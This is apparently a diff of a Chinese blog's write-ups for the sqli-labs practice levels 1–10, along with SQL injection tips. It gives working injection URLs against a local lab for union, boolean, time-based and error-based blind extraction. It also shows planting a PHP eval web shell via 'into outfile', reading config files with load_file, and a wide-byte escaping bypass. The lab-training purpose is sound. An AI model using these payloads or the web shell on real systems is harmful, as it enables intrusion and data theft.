+<p>可以看出来这里对ID的处理是<strong>((‘id’))</strong>，那么我们就可以使用<strong>1’)) or 1=1 –+</strong>进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-7/?id=1&apos;)) or 1=1--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-1.png" alt="7-1"></p>
+<p>那么我们现在就可以通过<strong>文件导入</strong>的方式写入文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-7/?id=-1&apos;)) union select 1,2,3 into outfile &quot;C:\\phpstudy\\WWW\\AAsqli-labs\\Less-7\\HSW.php&quot; --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-2.png" alt="7-2"></p>
+<p>可以看到虽然提示语法错误，但是我们这个<strong>HSW.php</strong>文件是已经写入的了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-3.png" alt="7-3"></p>
+<p>可以访问一下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-4.png" alt="7-4"></p>
+<p>既然是可以成功写入的，那么我们就可以把写入的内容换成<strong>一句话木马</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-7/?id=-1&apos;)) union select 1,2,&apos;&lt;?php @eval($_post[&quot;HSW&quot;])?&gt;&apos; into outfile &quot;C:\\phpstudy\\WWW\\AAsqli-labs\\Less-7\\HSW2.php&quot; --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-5.png" alt="7-5"></p>
+<p>注意：</p>
+<ol>
+<li>这里要写入的文件必须是之前没有的，如果我这里还是使用<strong>HSW.php</strong>，那么一句话木马是不会写入的。只有改成不存在的文件名，如<strong>HSW2.php</strong>才行</li>
+<li>我们这里用一句话代替之前3的位置，要加上2个<strong>单引号</strong>把语句括起来</li>
+</ol>
+<p>我们也是可以访问一下这个<strong>HSW2.php</strong>文件，看有没有导入成功。结果看来是有的</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-6.png" alt="7-6"></p>
+<p>这是就可以用<strong>蚁剑</strong>或者<strong>菜刀</strong>等等工具去连接</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-7.png" alt="7-7"></p>
+<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less - 8"></a>Less - 8</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-1.png" alt="8-1"></p>
+<p>此时我们发现和之前不同的是，没有报错信息了！怎么办？根据之前的经验，我们配合<strong>or 1=1 –+</strong> 进行尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; or 1=1 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-2.png" alt="8-2"></p>
+<p>嗯？返回正常结果了，那我们就可以猜，原文件对<strong>ID</strong>的处理只是简单的<strong>单引号</strong></p>
+<p>查看 <strong>index.php</strong> 文件，和我们猜想的一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>那么这关也是使用盲注，但是却只能用<strong>布尔注入</strong>和<strong>延时注入</strong></p>
+<p>这关<strong>报错注入无法使用</strong></p>
+<p><strong>布尔注入</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and substr(database(),1,1)&gt;&apos;a&apos; --+</span><br><span class="line"></span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and substr(database(),1,1)&gt;&apos;s&apos; --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-3.png" alt="8-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-4.png" alt="8-4"></p>
+<p><strong>延时注入</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">立即返回：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">等待5秒：http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;s&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-5.png" alt="8-5"></p>
+<p><strong>报错注入（无法使用）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-8/?id=1&apos; and extractvalue(1,concat(0x3a,(select database()),0x3a)) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/8-6.png" alt="8-6"></p>
+<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less - 9"></a>Less - 9</h2><p>题目的标题是<strong>Blind- Time based- Single Quotes</strong>，翻译就是<strong>盲注—基于时间—单引号</strong></p>
+<p>那么我们就根据提示去做题了</p>
+<p>从源代码我们可以看出，不管你做什么，它都只返回<strong>You are in ……..</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/9-1.png" alt="9-1"></p>
+<p><strong>爆数据库名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">立即返回：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">等待5秒：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;s&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/9-2.png" alt="9-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/9-3.png" alt="9-3"></p>
+<p>从上面这2张图我们也可以看出，不管输入什么都只返回<strong>You are in ……..</strong>，所以只能根据<strong>响应时间</strong>来判断</p>
+<p>……</p>
+<p>不断尝试之后，我们知道数据库名是<strong>security</strong></p>
+<p><strong>爆security数据库下的表名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)&gt;&apos;e&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第二个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),1,1)&gt;&apos;r&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第三个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 2,1),1,1)&gt;&apos;u&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第四个表：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 2,1),1,1)&gt;&apos;u&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<p>慢慢地爆出security下的表名：emails，referers，uagents，users</p>
+<p><strong>爆users表下的列名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)&gt;&apos;i&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第二列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1),1,1)&gt;&apos;u&apos;),1,sleep(5)) --+</span><br><span class="line"></span><br><span class="line">第三列：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),1,1)&gt;&apos;p&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<p>慢慢地爆出users下的列名：id，username，password</p>
+<p><strong>爆users表下的username列的数据</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一行：http://127.0.0.1/AAsqli-labs/Less-9/?id=1&apos; and if((substr((select username from users limit 0,1),1,1)&gt;&apos;d&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<p>爆出第一行的数据是dumb</p>
+<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less - 10"></a>Less - 10</h2><p>题目的标题是<strong>Blind- Time based- Double Quotes</strong>，翻译就是<strong>盲注—基于时间—双引号</strong></p>
+<p>那么这关和第9关的差别就只是<strong>单引号</strong>和<strong>双引号</strong>的问题了</p>
+<p>就不再赘述了，可以自己去尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-10/?id=1&quot; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/10-1.png" alt="10-1"></p>
+<p>至此，1-10关的Write-up结束</p>
+<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/30/Sqli-labs%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Sqli-labs</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/01/29/Sqli-labs 第1-10关/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Sqli-labs Tips" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -154,30 +442,40 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Tip-1-——-基础知识点"><a href="#Tip-1-——-基础知识点" class="headerlink" title="Tip 1 —— 基础知识点"></a>Tip 1 —— 基础知识点</h2><h4 id="（1）简单的用于尝试的语句"><a href="#（1）简单的用于尝试的语句" class="headerlink" title="（1）简单的用于尝试的语句"></a>（1）简单的用于尝试的语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">or 1=1--+</span><br><span class="line">&apos;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&apos;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br><span class="line"></span><br><span class="line">ps:--+和#可以互相替换</span><br></pre></td></tr></table></figure>
-<h4 id="（2）mysql命令行的简单命令"><a href="#（2）mysql命令行的简单命令" class="headerlink" title="（2）mysql命令行的简单命令"></a>（2）mysql命令行的简单命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查看所有的数据库</span><br><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">使用某个数据库(比如security数据库)</span><br><span class="line">use security;</span><br><span class="line"></span><br><span class="line">查看我们使用的数据库中有哪些表</span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">看一下我们想要查看的表的内容(比如users表)</span><br><span class="line">desc users;</span><br></pre></td></tr></table></figure>
-<h4 id="（3）利用-information-schema-数据库进行注入的命令"><a href="#（3）利用-information-schema-数据库进行注入的命令" class="headerlink" title="（3）利用 information_schema 数据库进行注入的命令"></a>（3）利用 <strong>information_schema</strong> 数据库进行注入的命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">猜数据库</span><br><span class="line">select schema_name from information_schema.schemata</span><br><span class="line"></span><br><span class="line">猜某库的所有表(比如security数据库)</span><br><span class="line">select table_name from information_schema.tables where table_schema=&apos;security&apos;</span><br><span class="line"></span><br><span class="line">猜某表的所有列(比如user表)</span><br><span class="line">select column_name from information_schema.columns where table_name=&apos;user&apos;</span><br></pre></td></tr></table></figure>
-<h4 id="（4）-order-by-命令"><a href="#（4）-order-by-命令" class="headerlink" title="（4） order by 命令"></a>（4） <strong>order by</strong> 命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用于显示某个表时，对表中某列进行排序，可以用来猜表有多少列</span><br><span class="line">比如：security-uers表中有3列，可以order by 1 ;order by 2;order by 3;分别是对第1，2，3列排序</span><br><span class="line">比如：security-email表中有2列，可以order by 1 ;order by 2;分别是对第1，2列排序</span><br><span class="line"></span><br><span class="line">ps：如果某一个表只有X列，当order by x+1时，就会开始出错，这一点可以用来猜表有多少列</span><br><span class="line">具体例子可以看less-1中的讲解</span><br></pre></td></tr></table></figure>
-<h4 id="（5）-union-命令"><a href="#（5）-union-命令" class="headerlink" title="（5） union 命令"></a>（5） <strong>union</strong> 命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union的作用是将两个sql语句进行联合</span><br><span class="line">union前后的两个sql语句的选择列数要相同才可以</span><br><span class="line">具体理解看less-1里的例子</span><br></pre></td></tr></table></figure>
-<h4 id="（6）几个常用函数"><a href="#（6）几个常用函数" class="headerlink" title="（6）几个常用函数"></a>（6）几个常用函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MySQL版本：version()</span><br><span class="line">数据库用户名：user()</span><br><span class="line">数据库名：database()</span><br><span class="line">数据库路径：@@datadir</span><br><span class="line">操作系统版本：@@version_compile_os</span><br></pre></td></tr></table></figure>
-<h4 id="（7）Limit的用法"><a href="#（7）Limit的用法" class="headerlink" title="（7）Limit的用法"></a>（7）Limit的用法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">limit 0，1				//表示从第1行开始，显示1行</span><br><span class="line">limit 1，3				//表示从第2行开始，显示3行</span><br><span class="line"></span><br><span class="line">可以参考以下图片看详细用法：</span><br></pre></td></tr></table></figure>
+        <h2 id="Tip-1-——-基础知识点"><a href="#Tip-1-——-基础知识点" class="headerlink" title="Tip 1 —— 基础知识点"></a>Tip 1 —— 基础知识点</h2><p>（1）简单的用于尝试的语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">or 1=1--+</span><br><span class="line">&apos;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&apos;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br><span class="line"></span><br><span class="line">ps:--+和#可以互相替换</span><br></pre></td></tr></table></figure>
+<p>（2）mysql命令行的简单命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查看所有的数据库</span><br><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">使用某个数据库(比如security数据库)</span><br><span class="line">use security;</span><br><span class="line"></span><br><span class="line">查看我们使用的数据库中有哪些表</span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">看一下我们想要查看的表的内容(比如users表)</span><br><span class="line">desc users;</span><br></pre></td></tr></table></figure>
+<p>（3）利用 <strong>information_schema</strong> 数据库进行注入的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">猜数据库</span><br><span class="line">select schema_name from information_schema.schemata</span><br><span class="line"></span><br><span class="line">猜某库的所有表(比如security数据库)</span><br><span class="line">select table_name from information_schema.tables where table_schema=&apos;security&apos;</span><br><span class="line"></span><br><span class="line">猜某表的所有列(比如user表)</span><br><span class="line">select column_name from information_schema.columns where table_name=&apos;user&apos;</span><br></pre></td></tr></table></figure>
+<p>（4） <strong>order by</strong> 命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用于显示某个表时，对表中某列进行排序，可以用来猜表有多少列</span><br><span class="line">比如：security-uers表中有3列，可以order by 1 ;order by 2;order by 3;分别是对第1，2，3列排序</span><br><span class="line">比如：security-email表中有2列，可以order by 1 ;order by 2;分别是对第1，2列排序</span><br><span class="line"></span><br><span class="line">ps：如果某一个表只有X列，当order by x+1时，就会开始出错，这一点可以用来猜表有多少列</span><br><span class="line">具体例子可以看less-1中的讲解</span><br></pre></td></tr></table></figure>
+<p>（5） <strong>union</strong> 命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union的作用是将两个sql语句进行联合</span><br><span class="line">union前后的两个sql语句的选择列数要相同才可以</span><br><span class="line">具体理解看less-1里的例子</span><br></pre></td></tr></table></figure>
+<p>（6）几个常用函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MySQL版本：version()</span><br><span class="line">数据库用户名：user()</span><br><span class="line">数据库名：database()</span><br><span class="line">数据库路径：@@datadir</span><br><span class="line">操作系统版本：@@version_compile_os</span><br></pre></td></tr></table></figure>
+<p>（7）Limit的用法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">limit 0，1				//表示从第1行开始，显示1行</span><br><span class="line">limit 1，3				//表示从第2行开始，显示3行</span><br><span class="line"></span><br><span class="line">可以参考以下图片看详细用法：</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/0.png" alt="0"></p>
-<h2 id="Tip-2-——-关于盲注的知识点"><a href="#Tip-2-——-关于盲注的知识点" class="headerlink" title="Tip 2 —— 关于盲注的知识点"></a>Tip 2 —— 关于盲注的知识点</h2><p>什么是盲注？盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注的类型分为以下三种：</p>
+<h2 id="Tip-2-——-盲注知识点"><a href="#Tip-2-——-盲注知识点" class="headerlink" title="Tip 2 —— 盲注知识点"></a>Tip 2 —— 盲注知识点</h2><p>什么是盲注？盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注的类型分为以下三种：</p>
 <ul>
 <li>基于布尔SQL盲注</li>
 <li>基于时间的SQL盲注</li>
 <li>基于报错的SQL盲注</li>
 </ul>
 <p>关于这方面知识的文章很多，我们这里就只做简单介绍</p>
-<h4 id="（1）基于布尔SQL盲注"><a href="#（1）基于布尔SQL盲注" class="headerlink" title="（1）基于布尔SQL盲注"></a>（1）基于布尔SQL盲注</h4><p>常用的函数：<strong>left()，substr()，mid()，ascii()，ord()</strong></p>
+<p>（1）基于布尔SQL盲注</p>
+<p>常用的函数：<strong>left()，substr()，mid()，ascii()，ord()</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">left(string,length)	  	//left()函数用于截取字符串string的前length个字符</span><br><span class="line"></span><br><span class="line">substr(string,start,length)	//substr()函数用于截取字符串string，从start位置开始，截取length长度</span><br><span class="line"></span><br><span class="line">mid(string,start,length)	//mid()函数功能和substr()函数一样</span><br><span class="line"></span><br><span class="line">ascii(string)			//ascii()函数用于将字符串string转换成ASCII码</span><br><span class="line"></span><br><span class="line">ord()				//ord()函数功能和ascii()函数一样</span><br></pre></td></tr></table></figure>
 <p>举几个<strong>栗子</strong>：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">left(database(),3)</span><br><span class="line">//database()用于显示数据库名称，3表示截取前3位，如database名称为&quot;security&quot;，那么结果就是&quot;sec&quot;</span><br><span class="line"></span><br><span class="line">left(database(),1) &gt; &apos;w&apos;</span><br><span class="line">//这个语句结果是否定的，因为&quot;security&quot;截取前1个字符是&quot;s&quot;，在26个字母顺序中&quot;s&quot;是在&quot;w&quot;前面的,</span><br><span class="line">所以是小于。如果将表达式的&quot;w&quot;换成&quot;a&quot;，则结果是肯定的</span><br><span class="line"></span><br><span class="line">substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)</span><br><span class="line">//首先string部分的结果是&quot;email&quot;，那么这整个语句的结果是&quot;a&quot;。关于limit的用法，可以在Tip 1上面看到</span><br></pre></td></tr></table></figure>
 <p>另外，关于正则表达式可以参考这篇文章：<a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">盲注之正则表达式</a></p>
-<h4 id="（2）基于报错的SQL盲注"><a href="#（2）基于报错的SQL盲注" class="headerlink" title="（2）基于报错的SQL盲注"></a>（2）基于报错的SQL盲注</h4><p>什么是报错盲注：构造payload让信息通过错误提示回显出来</p>
+<p>（2）基于报错的SQL盲注</p>
+<p>什么是报错盲注：构造payload让信息通过错误提示回显出来</p>
 <p>这里我们简单了解一下 <strong>extractvalue()和concat()</strong> 函数的用法就行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select database()),0x7e))</span><br><span class="line">//这个函数执行后会将数据库的名称通过报错方式显示出来</span><br></pre></td></tr></table></figure>
-<h4 id="（3）基于时间的SQL盲注"><a href="#（3）基于时间的SQL盲注" class="headerlink" title="（3）基于时间的SQL盲注"></a>（3）基于时间的SQL盲注</h4><p>什么是时间盲注：原理于布尔盲注差不多，只不过添加控制时间的函数：当结果正确（错误）时，让页面停留n秒后再返回结果</p>
+<p>（3）基于时间的SQL盲注</p>
+<p>什么是时间盲注：原理于布尔盲注差不多，只不过添加控制时间的函数：当结果正确（错误）时，让页面停留n秒后再返回结果</p>
 <p>常用函数：<strong>if()，sleep()</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(expr1,expr2,expr3)	//如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。</span><br><span class="line">sleep(n)		//睡眠n秒</span><br></pre></td></tr></table></figure>
 <p>举个<strong>栗子</strong>：</p>
@@ -236,6 +534,39 @@
 <p>（2）上述我们提到了load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile ‘c:\\wamp\\www\\test.php’</span><br></pre></td></tr></table></figure>
 <p>可以利用该语句将服务器当中的内容导入到web服务器下的目录，这样就可以得到数据了。上述my.ini当中存在password项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。</p>
+<h2 id="Tip-4-——-宽字节注入知识点"><a href="#Tip-4-——-宽字节注入知识点" class="headerlink" title="Tip 4 —— 宽字节注入知识点"></a>Tip 4 —— 宽字节注入知识点</h2><p>宽字节注入重点针对<code>’</code>和<code>\</code>的过滤，所以我们放在一起来进行讨论。</p>
+<p>对宽字节注入的同学应该对这几关的bypass方式应该比较了解。我们在此介绍一下宽字节注入的原理和基本用法。</p>
+<p>原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将 ‘ 转换为<code>\’</code>（转换的函数或者思路会在每一关遇到的时候介绍）。<br>因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：</p>
+<p>①%df吃掉 \   具体的原因是urlencode(‘)  = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。</p>
+<p>②将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。</p>
